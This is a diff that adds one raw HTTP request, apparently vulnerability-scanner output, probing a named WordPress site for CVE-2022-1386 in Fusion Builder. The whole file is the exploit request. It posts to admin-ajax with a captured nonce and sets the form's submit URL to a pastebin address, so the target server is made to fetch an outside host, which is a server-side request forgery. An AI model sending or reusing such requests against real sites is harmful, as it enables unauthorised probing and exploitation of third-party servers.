@@ -1,0 +1,12 @@
+POST https://arespublicfunds.com/wp-admin/admin-ajax.php HTTP/1.1
+User-Agent: CVE-2022-1386-Check/1.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+Referer: https://arespublicfunds.com/
+Origin: https://arespublicfunds.com
+Content-Length: 474
+Content-Type: application/x-www-form-urlencoded
+
+formData=email%3Dexample%2540example.com%26fusion_privacy_store_ip_ua%3Dfalse%26fusion_privacy_expiration_interval%3D48%26privacy_expiration_action%3Dignore%26fusion-form-nonce-0%3D35d667f2da%26fusion-fields-hold-private-data%3D&action=fusion_form_submit_form_to_url&fusion_form_nonce=35d667f2da&form_id=0&post_id=0&field_labels=%7B%22email%22%3A%22Email+address%22%7D&hidden_field_names=%5B%5D&fusionAction=https%3A%2F%2Fpastebin.com%2Fraw%2FXNBxNyaU&fusionActionMethod=GET
